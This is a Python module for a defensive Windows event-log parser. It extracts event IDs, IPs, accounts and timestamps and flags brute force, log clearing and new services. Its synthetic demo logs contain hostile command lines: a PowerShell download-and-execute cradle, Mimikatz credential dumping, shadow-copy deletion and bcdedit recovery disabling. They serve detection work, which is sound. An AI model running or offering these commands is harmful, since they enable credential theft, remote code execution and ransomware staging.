"""
Windows Event Log Parser
Extracts structured data from raw log text for analysis
"""

import re
from collections import Counter


# Common Windows Security Event IDs and their meanings
EVENT_ID_MAP = {
    "4624": "Successful logon",
    "4625": "Failed logon",
    "4634": "Account logoff",
    "4648": "Logon with explicit credentials",
    "4672": "Special privileges assigned",
    "4688": "Process creation",
    "4697": "Service installed",
    "4698": "Scheduled task created",
    "4700": "Scheduled task enabled",
    "4720": "User account created",
    "4728": "Member added to security group",
    "4732": "Member added to local group",
    "4756": "Member added to universal group",
    "4768": "Kerberos TGT requested",
    "4769": "Kerberos service ticket requested",
    "4771": "Kerberos pre-authentication failed",
    "4776": "NTLM authentication attempt",
    "7045": "New service installed",
    "1102": "Audit log cleared",
    "4698": "Scheduled task created",
    "4657": "Registry value modified",
    "4663": "File access attempt",
    "5140": "Network share accessed",
    "5145": "Network share object checked",
}

# High-risk event IDs worth flagging immediately
HIGH_RISK_EVENT_IDS = {"1102", "4697", "4720", "4728", "7045", "4698"}


def parse_windows_logs(raw_text: str) -> dict:
    """
    Parse raw Windows event log text into structured summary.
    Handles both formatted and unformatted log text.
    """
    lines = raw_text.strip().splitlines()
    total_lines = len(lines)

    # Extract Event IDs
    event_id_pattern = re.compile(r'Event(?:ID|Id|ID:)?\s*[:\-]?\s*(\d{3,5})', re.IGNORECASE)
    event_ids_found = []
    for line in lines:
        matches = event_id_pattern.findall(line)
        event_ids_found.extend(matches)

    event_id_counts = Counter(event_ids_found)

    # Extract IP addresses
    ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
    all_ips = []
    for line in lines:
        all_ips.extend(ip_pattern.findall(line))
    ip_counts = Counter(all_ips)

    # Extract usernames (common patterns)
    user_patterns = [
        re.compile(r'Account(?:\s+Name)?[:\s]+([a-zA-Z0-9_\-\.\\]+)', re.IGNORECASE),
        re.compile(r'User(?:name)?[:\s]+([a-zA-Z0-9_\-\.\\]+)', re.IGNORECASE),
        re.compile(r'Subject(?:\s+Account)?[:\s]+([a-zA-Z0-9_\-\.\\]+)', re.IGNORECASE),
    ]
    all_users = []
    for line in lines:
        for pat in user_patterns:
            matches = pat.findall(line)
            for m in matches:
                if m.lower() not in ('name', 'id', 'domain', 'type', 'logon', 'security', 'local'):
                    all_users.append(m)
    user_counts = Counter(all_users)

    # Extract timestamps
    timestamp_patterns = [
        re.compile(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}'),
        re.compile(r'\d{2}/\d{2}/\d{4}\s+\d{2}:\d{2}:\d{2}'),
    ]
    timestamps = []
    for line in lines:
        for pat in timestamp_patterns:
            matches = pat.findall(line)
            timestamps.extend(matches)

    # Detect quick patterns
    failed_logons = event_id_counts.get("4625", 0)
    successful_logons = event_id_counts.get("4624", 0)
    log_cleared = event_id_counts.get("1102", 0)
    new_services = event_id_counts.get("7045", 0) + event_id_counts.get("4697", 0)
    new_users = event_id_counts.get("4720", 0)
    privilege_use = event_id_counts.get("4672", 0)
    process_creation = event_id_counts.get("4688", 0)
    scheduled_tasks = event_id_counts.get("4698", 0)

    # Brute force heuristic
    brute_force_suspected = failed_logons >= 5

    # High-risk event IDs found
    high_risk_found = [eid for eid in HIGH_RISK_EVENT_IDS if eid in event_id_counts]

    return {
        "total_log_lines": total_lines,
        "unique_event_ids": len(event_id_counts),
        "event_id_breakdown": dict(event_id_counts.most_common(15)),
        "event_id_descriptions": {
            eid: EVENT_ID_MAP.get(eid, "Unknown event") 
            for eid in event_id_counts.keys()
        },
        "top_source_ips": dict(ip_counts.most_common(10)),
        "top_accounts": dict(user_counts.most_common(10)),
        "time_range": {
            "first": timestamps[0] if timestamps else "unknown",
            "last": timestamps[-1] if timestamps else "unknown",
            "total_timestamps": len(timestamps),
        },
        "quick_stats": {
            "failed_logons": failed_logons,
            "successful_logons": successful_logons,
            "log_cleared_events": log_cleared,
            "new_services_installed": new_services,
            "new_user_accounts": new_users,
            "privilege_use_events": privilege_use,
            "process_creation_events": process_creation,
            "scheduled_tasks_created": scheduled_tasks,
        },
        "heuristic_flags": {
            "brute_force_suspected": brute_force_suspected,
            "log_tampering": log_cleared > 0,
            "high_risk_event_ids_present": high_risk_found,
            "unusual_new_services": new_services > 0,
            "new_accounts_created": new_users > 0,
        }
    }


def generate_sample_logs(scenario: str) -> str:
    """Generate realistic sample Windows Event Logs for demo purposes."""

    scenarios = {
        "Brute Force + Lateral Movement": """
[2024-01-15 03:22:01] EventID 4625 - AUDIT FAILURE - An account failed to log on.
  Account Name: administrator  Source Network Address: 192.168.1.105  Logon Type: 3
[2024-01-15 03:22:03] EventID 4625 - AUDIT FAILURE - An account failed to log on.
  Account Name: administrator  Source Network Address: 192.168.1.105  Logon Type: 3
[2024-01-15 03:22:05] EventID 4625 - AUDIT FAILURE - An account failed to log on.
  Account Name: admin  Source Network Address: 192.168.1.105  Logon Type: 3
[2024-01-15 03:22:07] EventID 4625 - AUDIT FAILURE - An account failed to log on.
  Account Name: administrator  Source Network Address: 192.168.1.105  Logon Type: 3
[2024-01-15 03:22:08] EventID 4625 - AUDIT FAILURE - An account failed to log on.
  Account Name: svc_backup  Source Network Address: 192.168.1.105  Logon Type: 3
[2024-01-15 03:22:10] EventID 4625 - AUDIT FAILURE - An account failed to log on.
  Account Name: administrator  Source Network Address: 192.168.1.105  Logon Type: 3
[2024-01-15 03:22:44] EventID 4624 - AUDIT SUCCESS - An account was successfully logged on.
  Account Name: svc_backup  Source Network Address: 192.168.1.105  Logon Type: 3
[2024-01-15 03:22:45] EventID 4672 - Special privileges assigned to new logon.
  Account Name: svc_backup  Privileges: SeDebugPrivilege SeImpersonatePrivilege
[2024-01-15 03:23:01] EventID 4624 - An account was successfully logged on.
  Account Name: svc_backup  Source Network Address: 10.0.0.45  Logon Type: 3
[2024-01-15 03:23:15] EventID 4624 - An account was successfully logged on.
  Account Name: svc_backup  Source Network Address: 10.0.0.67  Logon Type: 3
[2024-01-15 03:23:30] EventID 5140 - A network share object was accessed.
  Account Name: svc_backup  Share Name: \\ADMIN$  Source: 10.0.0.45
[2024-01-15 03:23:45] EventID 5145 - A network share object was checked.
  Account Name: svc_backup  Share Name: \\C$  Object: \\Windows\\System32
""".strip(),

        "Privilege Escalation via PowerShell": """
[2024-01-16 14:10:01] EventID 4624 - AUDIT SUCCESS - Logon
  Account Name: jsmith  Source Network Address: 10.0.0.22  Logon Type: 2
[2024-01-16 14:10:45] EventID 4688 - A new process has been created.
  Creator: jsmith  New Process: C:\\Windows\\System32\\cmd.exe  Command: cmd.exe /c whoami
[2024-01-16 14:11:02] EventID 4688 - A new process has been created.
  Creator: jsmith  New Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  Command: powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
[2024-01-16 14:11:03] EventID 4688 - A new process has been created.
  Creator: jsmith  New Process: powershell.exe
  Command: powershell -nop -w hidden -c IEX(New-Object Net.WebClient).downloadstring('http://192.168.50.100/payload.ps1')
[2024-01-16 14:11:10] EventID 4697 - A service was installed in the system.
  Service Name: WindowsUpdateSvc32  Service File: C:\\Users\\jsmith\\AppData\\Local\\Temp\\svc.exe
[2024-01-16 14:11:11] EventID 4672 - Special privileges assigned to new logon.
  Account Name: jsmith  Privileges: SeDebugPrivilege SeTcbPrivilege SeLoadDriverPrivilege
[2024-01-16 14:12:00] EventID 4698 - A scheduled task was created.
  Task Name: \\Microsoft\\Windows\\UpdateCheck  Command: C:\\Users\\jsmith\\AppData\\Local\\svc.exe
  Author: jsmith  Trigger: Daily 03:00
[2024-01-16 14:15:33] EventID 1102 - The audit log was cleared.
  Subject Account Name: jsmith
""".strip(),

        "Credential Dumping (Mimikatz)": """
[2024-01-17 22:05:01] EventID 4624 - AUDIT SUCCESS - Logon
  Account Name: helpdesk  Source Network Address: 10.0.1.88  Logon Type: 3
[2024-01-17 22:05:30] EventID 4688 - Process Creation
  Creator: helpdesk  New Process: C:\\Users\\helpdesk\\Downloads\\mim.exe
  Command: mim.exe privilege::debug sekurlsa::logonpasswords
[2024-01-17 22:05:31] EventID 4673 - A privileged service was called.
  Account Name: helpdesk  Service: LsaRegisterLogonProcess()  Process: mim.exe
[2024-01-17 22:05:32] EventID 4688 - Process Creation
  Creator: helpdesk  New Process: C:\\Windows\\System32\\lsass.exe  Parent: mim.exe
[2024-01-17 22:05:35] EventID 4648 - Logon with explicit credentials.
  Account Name: helpdesk  Target Account: administrator  Target Server: DC01
[2024-01-17 22:05:40] EventID 4624 - AUDIT SUCCESS - Logon
  Account Name: administrator  Source: 10.0.1.88  Logon Type: 3
[2024-01-17 22:05:41] EventID 4672 - Special privileges assigned.
  Account Name: administrator  Privileges: SeDebugPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege
[2024-01-17 22:06:00] EventID 4769 - A Kerberos service ticket was requested.
  Account Name: administrator@CORP.LOCAL  Service: krbtgt  TicketEncryptionType: 0x17
[2024-01-17 22:06:01] EventID 4768 - A Kerberos TGT was requested.
  Account Name: administrator  Client Address: 10.0.1.88
[2024-01-17 22:10:00] EventID 5140 - Network share accessed.
  Account Name: administrator  Share Name: \\DC01\\SYSVOL  Source: 10.0.1.88
""".strip(),

        "Ransomware Pre-deployment": """
[2024-01-18 01:00:01] EventID 4625 - Failed logon. Account: backup_svc  Source: 185.220.101.55  Type: 3
[2024-01-18 01:00:03] EventID 4625 - Failed logon. Account: backup_svc  Source: 185.220.101.55  Type: 3
[2024-01-18 01:00:05] EventID 4625 - Failed logon. Account: backup_svc  Source: 185.220.101.55  Type: 3
[2024-01-18 01:00:07] EventID 4624 - Successful logon. Account: backup_svc  Source: 185.220.101.55  Type: 3
[2024-01-18 01:01:00] EventID 4688 - Process created. Process: vssadmin.exe  Command: vssadmin delete shadows /all /quiet
[2024-01-18 01:01:05] EventID 4688 - Process created. Process: wmic.exe  Command: wmic shadowcopy delete
[2024-01-18 01:01:10] EventID 4688 - Process created. Process: bcdedit.exe  Command: bcdedit /set {default} recoveryenabled No
[2024-01-18 01:01:15] EventID 4688 - Process created. Process: bcdedit.exe  Command: bcdedit /set {default} bootstatuspolicy ignoreallfailures
[2024-01-18 01:01:20] EventID 4698 - Scheduled task created.
  Task: \\encrypt_job  Command: C:\\ProgramData\\svc32.exe --encrypt C:\\  Author: backup_svc
[2024-01-18 01:02:00] EventID 7045 - New service installed.
  Service Name: CryptoSvc32  File: C:\\Windows\\Temp\\csvc.exe  Start Type: Auto
[2024-01-18 01:02:30] EventID 5140 - Network share accessed.
  Account: backup_svc  Share: \\FILESERVER01\\Shares  Source: 185.220.101.55
[2024-01-18 01:03:00] EventID 1102 - The audit log was cleared.  Account: backup_svc
""".strip(),
    }

    return scenarios.get(scenario, scenarios["Brute Force + Lateral Movement"])
